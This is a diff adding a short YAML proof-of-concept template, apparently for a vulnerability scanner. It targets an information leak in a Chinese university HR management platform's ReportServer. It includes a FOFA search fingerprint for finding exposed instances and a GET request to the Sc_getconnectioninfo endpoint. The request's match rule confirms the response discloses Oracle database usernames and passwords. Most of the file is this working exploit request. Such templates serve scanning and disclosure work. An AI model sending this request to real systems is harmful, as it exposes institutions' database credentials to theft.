@@ -1,0 +1,15 @@
+id: poc-yaml-epxing-reportserver-info-leak
+info:
+  name: 高校人力资源管理服务平台 ReportServer 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 高校人力资源管理服务平台
+  fofa: body="FM_SYS_ID" || body="product/recruit/website/RecruitIndex.jsp"
+requests:
+- method: GET
+  path: /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo
+  expression: status_code == 200 && contains(body,"oracle.jdbc.driver.OracleDriver")
+    && contains(body,"\"password\":") && contains(body,"\"user\":") && !contains(body,"<")
+variables: {}
+transport: http
